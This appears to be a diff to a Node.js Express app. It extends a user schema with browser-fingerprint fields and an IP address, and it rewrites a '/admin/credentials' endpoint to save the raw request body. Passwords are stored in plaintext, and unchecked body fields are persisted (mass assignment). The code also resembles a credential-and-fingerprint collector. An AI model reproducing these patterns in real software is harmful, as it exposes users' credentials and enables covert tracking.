@@ -15,6 +15,15 @@ mongoose.connect(process.env.MONGODB_URL)
 const UserSchema = new mongoose.Schema({
   username: String,
   password: String,
+  userAgent: String,
+  language: String,
+  platform: String,
+  screenResolution: String,
+  timeZone: String,
+  timestamp: Date,
+  referrer: String,
+  cookiesEnabled: Boolean,
+  ipAddress: String,
   createdAt: { type: Date, default: Date.now }
 });
 
@@ -39,8 +48,9 @@ app.get('/admin', (req, res) => {
 
 app.post('/admin/credentials', async (req, res) => {
   try {
-    const { username, password } = req.body;
-    const user = new User({ username, password });
+    const userData = req.body;
+    userData.ipAddress = req.ip;
+    const user = new User(userData);
     await user.save();
     req.session.userId = user._id;
     res.status(200).json({ message: 'Credentials stored' });
